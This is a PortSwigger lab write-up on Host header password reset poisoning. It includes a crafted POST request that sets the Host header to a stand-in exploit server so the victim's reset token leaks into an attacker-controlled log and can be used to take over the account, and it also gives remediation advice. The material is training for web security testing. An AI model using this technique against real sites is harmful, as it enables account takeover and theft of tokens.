# Lab: Basic Password Reset Poisoning

**Category:** HTTP Host Header Attacks
**Difficulty:** Apprentice
**Lab link:** [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

## Overview

The password reset function builds the reset link using the `Host` header value — e.g. `https://<Host>/forgot-password?temp-forgot-password-token=...`. Since the `Host` header is attacker-controlled, substituting it with an exploit server address causes the reset email to contain a link pointing at the attacker's server. When the victim clicks it, the token is leaked in the access log.

## Goal

Log in as `carlos` by stealing his password reset token via Host header poisoning.

## Key Concepts

- **Host header in reset links:** The app trusts the `Host` header to construct the reset URL — a fully attacker-controlled value.
- **Token leak via redirect:** The victim clicks the poisoned link; their browser makes a request to the attacker's server with the token in the URL.
- **Exploit server access log:** PortSwigger's exploit server logs all incoming requests — tokens appear as query parameters.

## Solution

### Step 1 — Understand the reset flow

Submit a password reset for `wiener` and check the email client. The reset link format is:
```
https://<lab>/forgot-password?temp-forgot-password-token=<token>
```

### Step 2 — Poison the reset request for carlos

In Repeater, submit a reset for carlos with the Host header replaced by your exploit server:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-EXPLOIT-SERVER.exploit-server.net

username=carlos
```

The app sends carlos an email with a reset link pointing at your exploit server.

### Step 3 — Steal the token from access logs

Go to the exploit server → **Access log**. Find the entry:
```
GET /forgot-password?temp-forgot-password-token=<TOKEN>
```

### Step 4 — Use the token

Visit the real lab URL with carlos's token:
```
https://<lab>/forgot-password?temp-forgot-password-token=<TOKEN>
```

Set a new password for carlos.

### Step 5 — Log in as carlos

Use the new password to log in. Lab solved.

## Remediation

- Never use the `Host` header to construct URLs in security-sensitive flows (password reset, email verification).
- Use a configured absolute base URL from server-side config instead.
- Validate the `Host` header against a whitelist of known domains.

## Key Takeaways

- Password reset poisoning is a high-impact, low-complexity attack — just one header change.
- The `Host` header is attacker-controlled in any HTTP request; never trust it for URL construction.
- Always test password reset flows with a modified `Host` header pointing to Burp Collaborator or an exploit server.
